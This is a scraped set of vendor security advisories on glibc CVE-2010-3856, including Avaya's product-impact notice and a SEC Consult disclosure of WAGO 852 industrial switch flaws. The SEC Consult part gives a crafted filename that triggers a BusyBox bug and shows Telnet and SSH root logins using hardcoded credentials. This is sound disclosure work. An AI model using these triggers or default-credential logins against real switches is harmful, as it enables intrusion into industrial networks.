* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from support.avaya.com_a1937bfe_20250125_231144.html ===


---

glibc security update (RHSA-2010-0793)

Original Release Date: November 30, 2010

Last Revised: June 24, 2013

Number: ASA-2010-333

Risk Level: Low

Advisory Version: 7.0

Advisory Status: Final

---

## 1. Overview:

The glibc packages contain the standard C libraries used by multiple
programs on the system. These packages contain the standard C and the
standard math libraries. Without these two libraries, a Linux system cannot
function properly.

It was discovered that the glibc dynamic linker/loader did not perform
sufficient safety checks when loading dynamic shared objects (DSOs) to
provide callbacks for its auditing API during the execution of
privileged programs. A local attacker could use this flaw to escalate
their privileges via a carefully-chosen system DSO library containing
unsafe constructors. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2010-3856](https://www.redhat.com/security/data/cve/CVE-2010-3856.html) to this issue.

More information about these vulnerabilities can be found in the security advisory issued by RedHat Linux:

* <https://rhn.redhat.com/errata/RHSA-2010-0793.html>

## 2. Avaya System Products using a modified version of RHEL5 with affected components/packages installed:

| Product: | Affected Version(s): | Risk Level: | Actions: |
| --- | --- | --- | --- |
| Avaya Aura® Application Enablement Services | 5.2, 5.2.1, 5.2.2 | Low | Upgrade to AES 5.2.3 or later. |
| Avaya Aura® Communication Manager | 6.0.x | Low | Upgrade to CM 6.2 or later. |
| Avaya Aura® Conferencing Standard Edition | 6.0 | Low | See recommended actions and mitigating factors table below. This advisory will not be addressed as no further releases are planned. It is recommended that customers migrate to one of Avaya's conferencing solutions including Avaya Aura® Conferencing 7.0 or later. |
| Avaya IQ | 5.0, 5.1 | Low | Upgrade to IQ 5.2 or later. |
| Avaya Aura® Presence Services | 6.0, 6.1, 6.1.1 | Low | Upgrade to PS 6.1.2 or later. |
| Avaya Aura® Session Manager | 1.1, 5.2, 6.0.x, 6.1, 6.1.1, 6.1.2 | Low | Upgrade to SM 6.1.3 or later. |
| Avaya Aura® System Manager | 5.2, 6.0.x, 6.1, 6.1.1 | Low | Upgrade to SMGR 6.1.2 or later. |
| Avaya Aura® System Platform | 1.1, 6.0, 6.0.1, 6.0.2 | Low | Upgrade to SP 6.0.3 or later. |
| Avaya Voice Portal | 5.0, 5.1, 5.1.1 | Low | Upgrade to VP 5.1.2 or later. |
| Avaya Communication Server 1000:  * CS1000E * CS1000M * CS1000E/CS1000M Signaling Server | 6.0, 7.x | Low | See recommended actions and mitigating factors table below. This advisory will not be addressed as no further releases are planned. |

**Recommended Actions for System Products:**
Avaya strongly recommends that customers follow
networking and security best practices by implementing
firewalls, ACLs, physical security or other appropriate
access restrictions. Though Avaya believes such
restrictions should always be in place; risk to Avaya's
product and the surrounding network from this potential
vulnerability may be mitigated by ensuring these
practices are implemented until such time as a product
update is available or the recommended action is applied.
Further restrictions as deemed necessary based on the
customer's security policies may be required during this
interim period.

### Mitigating Factors:

When determining risk, Avaya takes into account many factors as
outlined by Avaya's
[Security Vulnerability Classification Policy](https://support.avaya.com/css/P8/documents/100066674).
The following table describes factors that mitigate the risk of specific
vulnerabilities for the listed affected Avaya products:

| Vulnerability | Mitigating Factors |
| --- | --- |
| CVE-2010-3856 | Avaya has rated this a Low for all products as it would require privileged account access to exploit. |

## 3. Avaya Software-Only Products:

Avaya software-only products operate on general-purpose operating systems.
Occasionally vulnerabilities may be discovered in the underlying operating system or
applications that come with the operating system. These vulnerabilities often do not
impact the software-only product directly but may threaten the integrity of the
underlying platform.

In the case of this advisory Avaya software-only products are not affected by the
vulnerability directly but the underlying Linux platform may be. Customers should
determine on which Linux operating system the product was installed and then follow
that vendor's guidance.

| Product: | Actions: |
| --- | --- |
| Avaya Aura® Application Enablement Services 4.x/5.x | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the AES application. |
| CVLAN | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the CVLAN application. |
| Avaya Integrated Management Suite (IMS) | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the IMS application. |
| Avaya Aura® Presence Services | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the PS application. |
| Avaya Aura® System Manager 1.0 | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the SMGR application. |
| Voice Portal | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the Voice Portal application. |

**Recommended Actions for Software-Only Products:**
In the event that the affected package is installed, Avaya recommends that customers follow recommended actions supplied by RedHat Linux.

## 4. Additional Information:

Additional information may also be available via the Avaya support
[website](http://support.avaya.com) and through your Avaya
account representative. Please contact your Avaya product support
representative, or dial 1-800-242-2121, with any questions.

## 5. Disclaimer:

ALL INFORMATION IS BELIEVED TO BE CORRECT AT THE TIME OF PUBLICATION
AND IS PROVIDED "AS IS". AVAYA INC., ON BEHALF ITSELF AND ITS
SUBSIDIARIES AND AFFILIATES (HEREINAFTER COLLECTIVELY REFERRED TO AS
"AVAYA"), DISCLAIMS ALL WARRANTIES, EITHER EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY AND FITNESS
FOR A PARTICULAR PURPOSE AND FURTHERMORE, AVAYA MAKES NO REPRESENTATIONS
OR WARRANTIES THAT THE STEPS RECOMMENDED WILL ELIMINATE SECURITY OR VIRUS
THREATS TO CUSTOMERS' SYSTEMS. IN NO EVENT SHALL AVAYA BE LIABLE FOR ANY
DAMAGES WHATSOEVER ARISING OUT OF OR IN CONNECTION WITH THE INFORMATION OR
RECOMMENDED ACTIONS PROVIDED HEREIN, INCLUDING DIRECT, INDIRECT, INCIDENTAL,
STATUTORY, CONSEQUENTIAL DAMAGES, LOSS OF BUSINESS PROFITS OR SPECIAL DAMAGES,
EVEN IF AVAYA HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.

THE INFORMATION PROVIDED HERE DOES NOT AFFECT THE SUPPORT AGREEMENTS
IN PLACE FOR AVAYA PRODUCTS. SUPPORT FOR AVAYA PRODUCTS CONTINUES TO BE
EXECUTED AS PER EXISTING AGREEMENTS WITH AVAYA.

## 6. Revision History:

V 1.0 - November 30, 2010 - Initial Statement issued.

V 2.0 - July 19, 2011 - Changed AES, IQ, PS, SM, SMGR and SP affected versions and AES, IQ, SM, SMGR and SP actions.

V 3.0 - December 9, 2011 - Changed VP affected versions and actions.

V 4.0 - March 6, 2012 - Changed PS affected versions and actions.

V 5.0 - March 23, 2012 - Changed CM affected versions and action.

V 6.0 - June 7, 2013 - Changed CS1000 affected versions and actions.

V 7.0 - June 24, 2013 - Changed CSE actions and advisory status to final.

Send information regarding any discovered security problems with Avaya
products to either the contact noted in the product's documentation or
securityalerts@avaya.com.

© 2010 Avaya Inc. All Rights Reserved. All trademarks
identified by the ® or ™ are registered trademarks or trademarks,
respectively, of Avaya Inc. All other trademarks are the property of their respective owners.



=== Content from access.redhat.com_f625a0f3_20250126_124125.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from seclists.org_c14c9179_20250125_231158.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20190612-0 :: Multiple vulnerabilities in WAGO 852 Industrial Managed Switch Series

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Thu, 13 Jun 2019 08:01:54 +0200

---

```
SEC Consult Vulnerability Lab Security Advisory < 20190612-0 >
=======================================================================
              title: Multiple vulnerabilities
            product: WAGO 852 Industrial Managed Switch Series
 vulnerable version: 852-303: <v1.2.2.S0
                     852-1305: <v1.1.6.S0
                     852-1505: <v1.1.5.S0
      fixed version: 852-303: v1.2.2.S0
                     852-1305: v1.1.6.S0
                     852-1505: v1.1.5.S0
         CVE number: CVE-2019-12550, CVE-2019-12549
             impact: high
           homepage: <https://www.wago.com>
              found: 2019-03-08
                 by: T. Weber (Office Vienna)
                     IoT Inspector
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"New ideas are the driving force behind our success WAGO is a family-owned
company headquartered in Minden, Germany. Independently operating for three
generations, WAGO is the global leader of spring pressure electrical
interconnect and automation solutions. For more than 60 years, WAGO has
developed and produced innovative products for packaging, transportation,
process, industrial and building automation markets amongst others. Aside from
its innovations in spring pressure connection technology, WAGO has introduced
numerous innovations that have revolutionized industry. Further ground-breaking
inventions include: the WAGO-I/O-SYSTEM®, TOPJOB S® and WALL-NUTS®."

Source: <http://www.wago.us/wago/>

Business recommendation:
------------------------
SEC Consult recommends to immediately apply the available patches
from the vendor. A thorough security review should be performed by
security professionals to identify further potential security issues.

Vulnerability overview/description:
-----------------------------------
The industrial managed switch series 852 from WAGO is affected by multiple
vulnerabilities such as old software components embedded in the firmware.
Furthermore, hardcoded password hashes and credentials were also found by doing
an automated scan with IoT Inspector. Two vulnerabilities (CVE-2017-16544 and
CVE-2015-0235) were verified by emulating the device with the MEDUSA scaleable
firmware runtime. The validity of the password hashes and the embedded keys were
also verified by emulating the device.

1) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.12.0 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scaleable firmware runtime.

2) Known GNU glibc Vulnerabilities
The used GNU glibc in version 2.8 is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of
the discovered vulnerabilities (CVE-2015-0235, "GHOST") was verified by
using the MEDUSA scaleable firmware runtime.

3) Hardcoded Credentials (CVE-2019-12550)
The device contains hardcoded users and passwords which can be used to login
via SSH and Telnet.

4) Embedded Private Keys (CVE-2019-12549)
The device contains hardcoded private keys for the SSH daemon. The fingerprint
of the SSH host key from the corresponding SSH daemon matches to the embedded
private key.

Proof of concept:
-----------------
1) Known BusyBox Vulnerabilities
BusyBox version 1.12.0 contains multiple CVEs like:
CVE-2013-1813, CVE-2016-2148, CVE-2016-6301, CVE-2011-2716, CVE-2011-5325,
CVE-2015-9261, CVE-2016-2147 and more.

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device. A file with the name "\ectest\n\e]55;test.txt\a" was created
to trigger the vulnerability.

-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Known GNU glibc Vulnerabilities
GNU glibc version 2.8 contains multiple CVEs like:
CVE-2010-0296, CVE-2010-3856, CVE-2012-4412, CVE-2014-4043, CVE-2014-9402,
CVE-2014-9761, CVE-2014-9984, CVE-2015-1472 and more.

The gethostbyname buffer overflow vulnerability (GHOST) was checked with the help
of the exploit code from <https://seclists.org/oss-sec/2015/q1/274>. It was compiled
and executed on the emulated device to test the system.

3) Hardcoded Credentials (CVE-2019-12550)
The following credentials were found in the 'passwd' file of the firmware:
<Password Hash>                                 <Plaintext>         <User>
<removed>                                       <removed>            root
No password is set for the account              [EMPTY PASSWORD]     admin

By using these credentials, it's possible to connect via Telnet and SSH on the
emulated device. Example for Telnet:
-------------------------------------------------------------------------------
[root@localhost ~]# telnet 192.168.0.133
Trying 192.168.0.133...
Connected to 192.168.0.133.
Escape character is '^]'.

L2SWITCH login: root
Password:
~ #
-------------------------------------------------------------------------------
Example for SSH:
-------------------------------------------------------------------------------
[root@localhost ~]# ssh 192.168.0.133
root@192.168.0.133's password:
~ #
-------------------------------------------------------------------------------

4) Embedded Private Keys (CVE-2019-12549)
The following host key fingerprint is shown by accessing the SSH daemon on
the emulated device:

[root@localhost ~]# ssh 192.168.0.133
The authenticity of host '192.168.0.133 (192.168.0.133)' can't be established.
RSA key fingerprint is SHA256:X5Vr0/x0/j62N/aqZmHz96ojwl8x/I8mfzuT8o6uZso.
RSA key fingerprint is MD5:2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2.

This matches the embedded private key (which has been removed from this advisory):
SSH Fingerprint: 2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2

Vulnerable / tested versions:
-----------------------------
According to the vendor, the following versions are affected:
* 852-303: <v1.2.2.S0
* 852-1305: <v1.1.6.S0
* 852-1505: <v1.1.5.S0

Vendor contact timeline:
------------------------
2019-03-12: Contacting VDE CERT through info () cert vde com, received confirmation
2019-03-26: Asking for a status update, VDE CERT is still waiting for details
2019-03-28: VDE CERT requests information from WAGO again
2019-04-09: Asking for a status update
2019-04-11: VDE CERT: patched firmware release planned for end of May, requested
            postponement of advisory release
2019-04-16: VDE CERT: update regarding affected firmware versions
2019-04-24: Confirming advisory release for beginning of June
2019-05-20: Asking for a status update
2019-05-22: VDE CERT: no news from WAGO yet, 5th June release date
2019-05-29: Asking for a status update
2019-05-29: VDE CERT: detailed answer from WAGO, patches will be published
            on 7th June, SEC Consult proposes new advisory release date for
            12th June
2019-06-07: VDE CERT provides security advisory information from WAGO;
            WAGO releases security patches
2019-06-12: Coordinated release of security advisory

Solution:
---------
The vendor provides patches to their customers at their download page. The
following versions fix the issues:
* 852-303: v1.2.2.S0
* 852-1305: v1.1.6.S0
* 852-1505: v1.1.5.S0

According to the vendor, busybox and glibc have been updated and the embedded
private keys are being newly generated upon first boot and after a factory reset.
The root login via Telnet and SSH has been disabled and the admin account is
documented and can be changed by the customer.

Workaround:
-----------
Restrict network access to the device & SSH server.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2019

```

**Attachment:
[smime.p7s](att-14/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

---

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

### Current thread:

* **SEC Consult SA-20190612-0 :: Multiple vulnerabilities in WAGO 852 Industrial Managed Switch Series** *SEC Consult Vulnerability Lab (Jun 13)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from lists.opensuse.org_58f22f86_20250125_231156.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ/#SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ)

# [security-announce] SUSE Security Announcement: glibc (SUSE-SA:2010:052)

![](https://seccdn.libravatar.org/avatar/bff0c215e01f23fcee6fe49e65fae458.jpg?s=120&d=mm&r=g)
## [Marcus Meissner](/archives/users/7f6ceefc1eac47b3aa8bbc0c4e1230fe/ "See the profile for Marcus Meissner")

28 Oct
2010

28 Oct
'10

11:41

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
